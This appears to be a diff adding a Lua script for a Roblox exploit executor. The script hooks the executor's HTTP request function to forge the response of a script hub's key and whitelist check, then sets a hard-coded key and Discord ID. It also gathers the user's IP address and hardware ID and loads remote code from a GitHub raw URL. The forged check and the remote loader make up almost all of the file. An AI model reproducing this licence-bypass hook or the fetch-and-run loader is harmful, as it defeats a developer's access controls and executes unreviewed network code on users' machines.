@@ -1,0 +1,25 @@
+local a = syn.request
+local ipad = game:HttpGet("https://api.ipify.org")
+local hwid = syn.request({Url = "http://whitelist.polarhub.xyz:8880/Hwid", Method = "GET"}).Body
+
+setreadonly(syn, false)
+syn.request = function(x)
+    if x.Url:find("Key=") then
+        local res1 = a(x)
+        local stringtoenc = _G.Key .. "" .. hwid .. "" .. ipad .. "" .. _G.Discord
+        for i = 1,9 do
+            stringtoenc = syn.crypt.base64.encode(stringtoenc)
+        end
+        res1.Body = stringtoenc
+        return res1
+    end
+    return a(x)
+end
+setreadonly(syn, true)
+wait(1)
+-- _G.Key = "hee" -- key ถูกนะ
+-- _G.Discord = "493268684815466546"
+-- loadstring(game:HttpGet("https://raw.githubusercontent.com/9s0/1CIDLjl2s8/main/README.md"))()
+_G.Key = "hee_lighting_hub" 
+_G.Discord = "464413654851387405"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/9s0/1CIDLjl2s8/main/README.md"))()
